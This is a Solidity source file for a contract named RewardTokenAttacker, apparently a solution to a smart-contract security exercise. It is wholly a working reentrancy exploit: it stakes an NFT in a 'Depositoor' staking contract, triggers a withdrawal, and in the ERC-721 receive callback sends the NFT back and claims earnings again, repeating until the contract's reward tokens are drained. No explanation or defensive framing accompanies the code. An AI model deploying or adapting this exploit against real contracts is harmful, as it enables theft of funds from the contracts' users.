// SPDX-License-Identifier: GPL-3.0
pragma solidity =0.8.19;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import  {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

interface IDepositoor {
    function claimEarnings(uint256 _tokenId) external;
    function withdrawAndClaimEarnings(uint256 _tokenId) external;
}

contract RewardTokenAttacker {

    IDepositoor depositoor;
    IERC20 rewardToken;
    IERC721 nft;

    constructor(address _depositoor, address _rewardToken, address _nft ) {
        depositoor = IDepositoor(_depositoor);
        rewardToken = IERC20(_rewardToken);
        nft = IERC721(_nft);
    }

    function stake() external {
        nft.approve(address(depositoor), 42);
        nft.safeTransferFrom(address(this) ,address(depositoor), 42);
    }
    
    function attack() external {
        depositoor.withdrawAndClaimEarnings(42);
    }

    /**
     * @dev accept erc721 from safeTransferFrom and safeMint after callback
     * @return received selector
     */
    function onERC721Received(
        address ,
        address from,
        uint256 id ,
        bytes calldata 
    ) public virtual returns (bytes4) {
        if(rewardToken.balanceOf(address(depositoor)) > 0) {

            if(from == address(depositoor)) {
                nft.transferFrom(address(this) ,address(depositoor), id);
                depositoor.claimEarnings(id);
            }
        }
        return this.onERC721Received.selector;
    }

}
